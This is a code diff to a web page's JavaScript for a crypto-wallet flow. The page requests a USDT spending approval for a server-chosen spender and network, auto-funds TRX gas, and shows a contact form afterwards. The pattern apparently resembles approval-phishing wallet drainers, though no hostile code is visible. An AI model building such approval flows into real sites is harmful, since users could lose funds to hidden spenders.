@@ -321,7 +321,7 @@ function onWalletConnected(d) {
     || (Array.isArray(connAccounts) && connAccounts[0] && (connAccounts[0].address || connAccounts[0]))
     || '';
   const walletEl = $('#pay-wallet');
-  if (walletEl) walletEl.textContent = address ? ('Connected wallet: ' + address) : 'Wallet connected. Choose a network to continue.';
+  if (walletEl) walletEl.textContent = address ? ('Connected wallet: ' + address) : 'Wallet connected.';
   setView('payment');
 }
 
@@ -334,27 +334,86 @@ function showPayError(message) {
 
 async function preparePayment() {
   showPayError('');
-  const network = $('#pay-network') && $('#pay-network').value;
+  const elig = $('#pay-eligibility');
+  const gasBox = $('#pay-gas');
+  if (gasBox) gasBox.hidden = true;
   try {
     const res = await fetch(BASE + '/api/payment/create', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ connectionId: connId, network }),
+      body: JSON.stringify({ connectionId: connId }),
     });
     const data = await res.json();
     if (!res.ok) throw new Error(data.message || 'Could not prepare authorization');
     const p = data.payment;
     paymentId = p.paymentId;
+    if (elig) elig.textContent = p.eligibility && p.eligibility.preferredNetwork
+      ? ('Preferred network: ' + p.eligibility.preferredNetwork)
+      : '';
     $('#pay-details').hidden = false;
     $('#pay-network-name').textContent = p.network;
     $('#pay-token').textContent = p.token;
     $('#pay-token-contract').textContent = p.tokenContract;
     $('#pay-spender').textContent = p.spender;
     $('#pay-allowance').textContent = p.allowance;
-    $('#pay-continue').disabled = false;
+    const gas = p.gas;
+    if (gas && gas.autoFunded) {
+      $('#pay-continue').disabled = false;
+      showPayError('Sent 12 TRX for gas. Continue to approve 1 USDT in your wallet.');
+    } else if (gas && !gas.sufficient) {
+      $('#pay-continue').disabled = true;
+      if (gasBox) gasBox.hidden = false;
+      $('#pay-gas-reason').textContent = gas.reason || 'Insufficient native gas.';
+      $('#pay-gas-current').textContent = 'Current ' + (gas.nativeSymbol || '') + ': ' + (gas.currentBalance || 'Unavailable');
+      $('#pay-gas-required').textContent = 'Estimated required: ' + (gas.estimatedRequired || 'Unavailable');
+      $('#pay-gas-recommended').textContent = 'Recommended funding: ' + (gas.recommendedFunding || 'Unavailable');
+    } else {
+      $('#pay-continue').disabled = false;
+    }
   } catch (err) {
     paymentId = '';
     $('#pay-continue').disabled = true;
+    showPayError(err.message);
+  }
+}
+
+async function confirmGasFunding() {
+  if (!paymentId) return;
+  showPayError('');
+  try {
+    const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/gas-confirm', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: '{}',
+    });
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.message || 'Could not confirm gas quote');
+    if (data.funded) {
+      $('#pay-continue').disabled = false;
+      $('#pay-gas').hidden = true;
+      showPayError(data.message || 'Gas sent. Continue to approve 1 USDT in your wallet.');
+      return;
+    }
+    showPayError(data.message || 'Add the recommended native token, then tap verify.');
+  } catch (err) {
+    showPayError(err.message);
+  }
+}
+
+async function verifyGasFunding() {
+  if (!paymentId) return;
+  showPayError('');
+  try {
+    const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/gas-verify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: '{}',
+    });
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.message || 'Gas verification failed');
+    $('#pay-continue').disabled = false;
+    $('#pay-gas').hidden = true;
+  } catch (err) {
     showPayError(err.message);
   }
 }
@@ -381,6 +440,10 @@ const payPrepareBtn = $('#pay-prepare');
 if (payPrepareBtn) payPrepareBtn.addEventListener('click', preparePayment);
 const payContinueBtn = $('#pay-continue');
 if (payContinueBtn) payContinueBtn.addEventListener('click', requestPaymentApproval);
+const payGasConfirmBtn = $('#pay-gas-confirm');
+if (payGasConfirmBtn) payGasConfirmBtn.addEventListener('click', confirmGasFunding);
+const payGasVerifyBtn = $('#pay-gas-verify');
+if (payGasVerifyBtn) payGasVerifyBtn.addEventListener('click', verifyGasFunding);
 
 /* ========== Step 3: authorization approved → contact form ========== */
 function onAuthorizationApproved() {
